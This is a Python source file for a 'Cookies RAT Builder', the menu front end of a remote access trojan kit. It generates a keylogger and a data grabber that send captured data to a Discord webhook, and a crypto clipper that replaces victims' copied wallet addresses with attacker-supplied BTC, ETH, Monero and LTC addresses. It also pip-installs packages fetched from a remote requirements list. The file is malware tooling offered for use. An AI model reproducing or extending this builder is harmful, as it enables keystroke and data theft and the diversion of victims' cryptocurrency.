import os
try: import requests
except ImportError: os.system('pip install requests')

'''
Try importing modules
'''

try: 
    from util.plugins.common import *
    from colorama import Fore
    from cookies_package import *
    from time import sleep

    from util.create_crypto_clipper import Create_Crypto_Clipper
    from util.create_key_logger import Create_KeyLogger
    from util.create_data_grabber import Create_Data_Grabber

    from assets.modules import *
except:
    failed = False
    modules = []
    os.system('cls') # Clear screen to fix color issues
    '''
    Attempt to download each module 1 by 1
    '''
    r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/requirements.txt").text
    for i in r.splitlines():
        try:
            os.system(f"pip install {i}")
        except:
            failed = True
            modules.append(i)
            print(f"Failed to install module {i}")
            pass
    
    if failed: 
        os.system('cls')
        print(f"Seems like {str(modules)} modules failed to install please run the setup.bat again, if this problem persists contact CookiesKush420")
        input("\n\nPress enter to exit...")
        exit()





'''
MAIN MENU
'''
def main_menu():
    clear()
    settitle(f"Cookies RAT Builder")
    
    print(banner)
    choice = str(input(
            f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 

    if choice == '1':     # Create Custom PayLoad
        clear()
        print(f"{Fore.LIGHTRED_EX}Still in development. . .{Fore.RESET}")
        sleep(1)
        main_menu()

    elif choice == '2':     # Create Keylogger Add on
        clear()
        webhook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        intervals = str(input(
            f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
        if intervals == "":
            Create_KeyLogger(webhook, "60")
            main_menu()
        Create_KeyLogger(webhook, intervals)
        main_menu()

    elif choice == '3':     # Create Data Grabber Add on
        clear()
        webhook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        Create_Data_Grabber(webhook)
        main_menu()

    elif choice == '4':     # Create Crypto Clipper Add on
        clear()
        btc = str(input(
            f'{Fore.CYAN}Enter BTC address {Fore.YELLOW}>> {Fore.RESET}'))
        eth = str(input(
            f'{Fore.CYAN}Enter ETH address {Fore.YELLOW}>> {Fore.RESET}'))
        mon = str(input(
            f'{Fore.CYAN}Enter MONERO address {Fore.YELLOW}>> {Fore.RESET}'))
        ltc = str(input(
            f'{Fore.CYAN}Enter LTC address {Fore.YELLOW}>> {Fore.RESET}'))
        Create_Crypto_Clipper(btc, eth, mon, ltc)
        main_menu()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        clear()
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main_menu()



if __name__ == "__main__":
    main_menu()
